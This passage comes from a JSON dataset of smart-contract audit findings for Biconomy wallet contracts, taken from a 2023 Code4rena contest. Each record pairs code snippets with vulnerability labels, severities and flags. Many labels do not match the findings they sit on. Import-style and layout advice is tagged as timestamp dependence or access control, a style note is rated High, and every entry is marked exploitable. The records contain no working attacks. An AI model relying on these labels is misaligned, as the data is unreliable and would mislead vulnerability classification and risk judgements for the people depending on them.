}\nscw-contracts\\contracts\\smart-contract-wallet\\BaseSmartAccount.sol::13-17\nscw-contracts\\contracts\\smart-contract-wallet\\BaseSmartAccount.sol::21-25\nscw-contracts\\contracts\\smart-contract-wallet\\BaseSmartAccount.sol::61 => external override virtual returns (uint256 deadline) {\nscw-contracts\\contracts\\smart-contract-wallet\\BaseSmartAccount.sol::88 => internal virtual returns (uint256 deadline);\nscw-contracts\\contracts\\smart-contract-wallet\\Proxy.sol::16-19\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::19-28\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::156 => public view\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::507 => internal override virtual returns (uint256 deadline) {\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccountFactory.sol::69-71\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "Findings:",
    "description": "scw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\EntryPoint.sol::73 => unchecked { scw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\EntryPoint.sol::185 => unchecked { scw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\EntryPoint.sol::249 => unchecked { scw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\EntryPoint.sol::290 => internal returns (uint256 gasUsedByValidateAccountPrepayment, address actualAggregator, uint256 deadline) { scw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\EntryPoint.sol::291 => unchecked {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 25,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\nscw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\EntryPoint.sol\nscw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\StakeManager.sol\nscw-contracts\\contracts\\smart-contract-wallet\\base\\FallbackManager.sol\nscw-contracts\\contracts\\smart-contract-wallet\\base\\ModuleManager.sol\nscw-contracts\\contracts\\smart-contract-wallet\\paymasters\\verifying\\singleton\\VerifyingSingletonPaymaster.sol\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccountFactory.sol\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "Findings",
    "description": "Following files: scw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\EntryPoint.sol scw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\StakeManager.sol scw-contracts\\contracts\\smart-contract-wallet\\base\\FallbackManager.sol scw-contracts\\contracts\\smart-contract-wallet\\base\\ModuleManager.sol",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 9,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.533,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "\nscw-contracts\\contracts\\smart-contract-wallet\\Proxy.sol::11 => bytes32 internal constant _IMPLEMENTATION_SLOT \nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::42 => bytes32 internal constant DOMAIN_SEPARATOR_TYPEHASH \nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::48 => bytes32 internal constant ACCOUNT_TX_TYPEHASH \n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "Findings :",
    "description": "scw-contracts\\contracts\\smart-contract-wallet\\Proxy.sol::11 => bytes32 internal constant _IMPLEMENTATION_SLOT scw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::42 => bytes32 internal constant DOMAIN_SEPARATOR_TYPEHASH scw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::48 => bytes32 internal constant ACCOUNT_TX_TYPEHASH",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 5,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.352,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "\nscw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\EntryPoint.sol::484 => function getUserOpGasPrice(MemoryUserOp memory mUserOp) internal view returns (uint256) {\nand etc ...\n",
    "vulnerability_label": 1,
    "vulnerability_type": "price_manipulation",
    "severity": "Medium",
    "title": "Findings:",
    "description": "scw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\EntryPoint.sol::484 => function getUserOpGasPrice(MemoryUserOp memory mUserOp) internal view returns (uint256) { and etc ...",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 4,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.185,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      1,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "\nscw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\EntryPoint.sol::321 => if (_deadline != 0 && _deadline < block.timestamp) {\nscw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\EntryPoint.sol::365 => if (_deadline != 0 && _deadline < block.timestamp) {\nscw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\StakeManager.sol::84 => uint64 withdrawTime = uint64(block.timestamp) + info.unstakeDelaySec;\nscw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\StakeManager.sol::101 => require(info.withdrawTime <= block.timestamp, \"Stake withdrawal is not due\");\n",
    "vulnerability_label": 1,
    "vulnerability_type": "timestamp_dependence",
    "severity": "Medium",
    "title": "Findings:",
    "description": "scw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\EntryPoint.sol::321 => if (_deadline != 0 && _deadline < block.timestamp) { scw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\EntryPoint.sol::365 => if (_deadline != 0 && _deadline < block.timestamp) { scw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\StakeManager.sol::84 => uint64 withdrawTime = uint64(block.timestamp) + info.unstakeDelaySec; scw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\StakeManager.sol::101 => require(info.withdrawTime <= block.timestamp, \"Stake withdrawal is not due\");",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.586,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::507 => internal override virtual returns (uint256 deadline) {\nscw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\EntryPoint.sol::168 => function innerHandleOp(bytes calldata callData, UserOpInfo memory opInfo, bytes calldata context) external returns (uint256 actualGasCost) {\nscw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\StakeManager.sol::18 => function getDepositInfo(address account) public view returns (DepositInfo memory info) {\nscw-contracts\\contracts\\smart-contract-wallet\\paymasters\\PaymasterHelpers.sol::27 => ) internal pure returns (bytes memory context) {\nscw-contracts\\contracts\\smart-contract-wallet\\paymasters\\verifying\\singleton\\VerifyingSingletonPaymaster.sol::98 => external view override returns (bytes memory context, uint256 deadline) {\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "Findings:",
    "description": "scw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::507 => internal override virtual returns (uint256 deadline) { scw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\EntryPoint.sol::168 => function innerHandleOp(bytes calldata callData, UserOpInfo memory opInfo, bytes calldata context) external returns (uint256 actualGasCost) { scw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\StakeManager.sol::18 => function getDepositInfo(address account) public view returns (DepositInfo memory info) { scw-contracts\\contracts\\smart-contract-wallet\\paymasters\\PaymasterHelpers.sol::27 => ) internal pure returns (bytes memory context) { scw-contracts\\contracts\\smart-contract-wallet\\paymasters\\verifying\\singleton\\VerifyingSingletonPaymaster.sol::98 => external view override returns (bytes memory context, uint256 deadline) {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 7,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.846,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nimport {contract1, contract2} from \"filename.sol\";\n",
    "vulnerability_label": 1,
    "vulnerability_type": "timestamp_dependence",
    "severity": "Low",
    "title": "# 1. Improve the Readability by following modularity principles",
    "description": "To make your Solidity code more modern and readable, it is recommended to update your import statements to only include the specific contracts or objects that you need. This practice, known as modular programming, helps to keep the code cleaner and more organized. To avoid unnecessarily polluting the source code with unused contracts or objects, it is recommended to use specific imports with curly braces. An example of this syntax is shown below: import {contract1, contract2} from \"filename.sol\"; By using specific imports in this way, you can ensure that your code follows the principles of modularity and is as clear and maintainable as possible.",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 3,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.06,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\n// events is coming after functions\n17:    event CalledFrom(address sender);\n\n// state vars are coming after functions\n22:    mapping(uint256 => uint256) public xxx;\n23:    uint256 public offset;\n",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "Low",
    "title": "Layout Order [1]",
    "description": "- The best-practices for layout within a contract is the following order: state variables, events, modifiers, constructor and functions. https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccountFactory.sol // event coming after constructor 24:    event SmartAccountCreated(address indexed _proxy, address indexed _implementation, address indexed _owner, string version, uint256 _index); https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/test/TestCounter.sol",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 8,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.205,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol\n\n/// @audit missing __ReentrancyGuard_init()\n18:   contract SmartAccount is \n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Medium",
    "title": "[L&#x2011;01]  Upgradeable contract not initialized",
    "description": "Upgradeable contracts are initialized via an initializer function rather than by a constructor. Leaving such a contract uninitialized may lead to it being taken over by a malicious user *There is 1 instance of this issue:* File: scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol /// @audit missing __ReentrancyGuard_init() 18:   contract SmartAccount is",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 7,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.156,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol\n\n/// @audit ModuleManager\n/// @audit SignatureDecoder\n/// @audit SecuredTokenTransfer\n/// @audit FallbackManager\n18:   contract SmartAccount is \n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "[L&#x2011;02]  Not all parent contracts are upgradeable",
    "description": "Upgrades will break if the contracts in question have variables whose values are initialized in the constructor, or have variables where initial values are [set in field declarations](https://docs.openzeppelin.com/upgrades-plugins/1.x/writing-upgradeable#avoid-initial-values-in-field-declarations) *There are 4 instances of this issue:* File: scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol /// @audit ModuleManager /// @audit SignatureDecoder",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 10,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.224,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol\n\n288:              payment = (gasUsed + baseGas) * (gasPrice) / (tokenGasPriceFactor);\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "price_manipulation",
    "severity": "Medium",
    "title": "[L&#x2011;03]  Loss of precision",
    "description": "Division by large numbers may result in the result being zero, due to solidity not supporting fractions. Consider requiring a minimum amount for the numerator to ensure that it is always larger than the denominator *There is 1 instance of this issue:* File: scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol 288:              payment = (gasUsed + baseGas) * (gasPrice) / (tokenGasPriceFactor); https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L288",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.166,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      1,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol\n\n350:              _signer = ecrecover(dataHash, v, r, s);\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "[L&#x2011;04]  Signatures vulnerable",
    "description": "`ecrecover()` accepts as valid, two versions of signatures, meaning an attacker can use the same signature twice. Consider adding checks for signature malleability, or using OpenZeppelin's `ECDSA` library to perform the extra checks necessary in order to prevent this attack. In addition, non-zero must be checked for as the resulting signer, or else invalid signatures may be useable *There is 1 instance of this issue:* File: scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol 350:              _signer = ecrecover(dataHash, v, r, s); https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L350",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.138,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol\n\n550:      receive() external payable {}\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "Medium",
    "title": "[L&#x2011;05]  Empty `receive()`/`payable fallback()` function does not authorize requests",
    "description": "If the intention is for the Ether to be used, the function should call another function, otherwise it should revert (e.g. `require(msg.sender == address(weth))`). Having no access control on the function means that someone may send Ether to the contract, and have no way to get anything back out, which is a loss of funds. If the concern is having to spend a small amount of gas to check the sender against an immutable address, the code should at least have a function to rescue unused Ether. *There is 1 instance of this issue:* File: scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol 550:      receive() external payable {} https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L550",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.12,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: scw-contracts/contracts/smart-contract-wallet/common/Singleton.sol\n\n13:           assert(_IMPLEMENTATION_SLOT == bytes32(uint256(keccak256(\"biconomy.scw.proxy.implementation\")) - 1));\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "[L&#x2011;06]  `require()` should be used instead of `assert()`",
    "description": "Prior to solidity version 0.8.0, hitting an assert consumes the **remainder of the transaction's available gas** rather than returning it, as `require()`/`revert()` do. `assert()` should be avoided even past solidity version 0.8.0 as its [documentation](https://docs.soliditylang.org/en/v0.8.14/control-structures.html#panic-via-assert-and-error-via-require) states that \"The assert function creates an error of type Panic(uint256). ... Properly functioning code should never create a Panic, not even on invalid external input. If this happens, then there is a bug in your contract which you should fix\". *There are 2 instances of this issue:* File: scw-contracts/contracts/smart-contract-wallet/common/Singleton.sol 13:           assert(_IMPLEMENTATION_SLOT == bytes32(uint256(keccak256(\"biconomy.scw.proxy.implementation\")) - 1)); https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/common/Singleton.sol#L13",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.2,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol\n\n255:          // TODO: copy logic of gasPrice?\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "dos",
    "severity": "Medium",
    "title": "[L&#x2011;07]  Open TODOs",
    "description": "Code architecture, incentives, and error handling/reporting questions/issues should be resolved before deployment *There is 1 instance of this issue:* File: scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol 255:          // TODO: copy logic of gasPrice? https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol#L255",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.138,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      1,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol\n\n18    contract SmartAccount is \n19         Singleton,\n20         BaseSmartAccount,\n21         IERC165,\n22         ModuleManager,\n23         SignatureDecoder,\n24         SecuredTokenTransfer,\n25         ISignatureValidatorConstants,\n26         FallbackManager,\n27         Initializable,\n28:        ReentrancyGuardUpgradeable\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Low",
    "title": "[N&#x2011;01]  Upgradeable contract is missing a `__gap[50]` storage variable to allow for new storage variables in later versions",
    "description": "See [this](https://docs.openzeppelin.com/contracts/4.x/upgradeable#storage_gaps) link for a description of this storage variable. While some contracts may not currently be sub-classed, adding the variable now protects against forgetting to add it in the future. *There is 1 instance of this issue:* File: scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol 18    contract SmartAccount is 19         Singleton,",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 16,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.404,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol\n\n4:    import \"./libs/LibAddress.sol\";\n\n5:    import \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\n\n6:    import \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";\n\n7:    import \"@openzeppelin/contracts-upgradeable/security/ReentrancyGuardUpgradeable.sol\";\n\n8:    import \"./BaseSmartAccount.sol\";\n\n9:    import \"./common/Singleton.sol\";\n\n10:   import \"./base/ModuleManager.sol\";\n\n11:   import \"./base/FallbackManager.sol\";\n\n12:   import \"./common/SignatureDecoder.sol\";\n\n13:   import \"./common/SecuredTokenTransfer.sol\";\n\n14:   import \"./interfaces/ISignatureValidator.sol\";\n\n15:   import \"./interfaces/IERC165.sol\";\n\n16:   import \"@openzeppelin/contracts/utils/cryptography/ECDSA.sol\";\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Medium",
    "title": "[N&#x2011;02]  Import declarations should import specific identifiers, rather than the whole file",
    "description": "Using import declarations of the form `import {<identifier_name>} from \"some/file.sol\"` avoids polluting the symbol namespace making flattened files smaller, and speeds up compilation *There are 54 instances of this issue:* File: scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol 12:   import \"../interfaces/IAccount.sol\"; 13:   import \"../interfaces/IPaymaster.sol\";",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 30,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.778,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol\n\n27:        Initializable,\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "Medium",
    "title": "[N&#x2011;03]  Missing `initializer` modifier on constructor",
    "description": "OpenZeppelin [recommends](https://forum.openzeppelin.com/t/uupsupgradeable-vulnerability-post-mortem/15680/5) that the `initializer` modifier be applied to constructors in order to avoid potential griefs, [social engineering](https://forum.openzeppelin.com/t/uupsupgradeable-vulnerability-post-mortem/15680/4), or exploits. Ensure that the modifier is applied to the implementation contract. If the default constructor is currently being used, it should be changed to be an explicit one with the modifier applied. *There is 1 instance of this issue:* File: scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol 27:        Initializable, https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L27",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.106,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\nhttps://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/interfaces/IERC1271Wallet.sol#L1\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "[N&#x2011;04]  Unused file",
    "description": "The file is never imported by any other file *There are 2 instances of this issue:* File: scw-contracts/contracts/smart-contract-wallet/interfaces/IERC1271Wallet.sol 1:    // SPDX-License-Identifier: Apache-2.0 https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/interfaces/IERC1271Wallet.sol#L1",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 4,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.174,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: scw-contracts/contracts/smart-contract-wallet/libs/Math.sol\n\n133:              return result;\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "[N&#x2011;05]  Adding a `return` statement when the function defines a named return variable, is redundant",
    "description": "*There is 1 instance of this issue:* File: scw-contracts/contracts/smart-contract-wallet/libs/Math.sol 133:              return result; https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/libs/Math.sol#L133",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.11,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: scw-contracts/contracts/smart-contract-wallet/paymasters/BasePaymaster.sol\n\n28:       function validatePaymasterUserOp(UserOperation calldata userOp, bytes32 userOpHash, uint256 maxCost)\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "[N&#x2011;06]  `override` function arguments that are unused should have the variable name removed or commented out to avoid compiler warnings",
    "description": "*There are 3 instances of this issue:* File: scw-contracts/contracts/smart-contract-wallet/paymasters/BasePaymaster.sol 28:       function validatePaymasterUserOp(UserOperation calldata userOp, bytes32 userOpHash, uint256 maxCost) https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/paymasters/BasePaymaster.sol#L28",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.203,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\nhttps://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/libs/LibAddress.sol#L14\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "High",
    "title": "[N&#x2011;07]  Non-assembly method available",
    "description": "`assembly{ id := chainid() }` => `uint256 id = block.chainid`, `assembly { size := extcodesize() }` => `uint256 size = address().code.length`, `assembly { hash := extcodehash() }` => `bytes32 hash = address().codehash` There are some automated tools that will flag a project as having higher complexity if there is inline-assembly, so it's best to avoid using it where it's not necessary *There are 2 instances of this issue:* File: scw-contracts/contracts/smart-contract-wallet/libs/LibAddress.sol 14:       assembly { csize := extcodesize(account) }",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 4,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.165,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
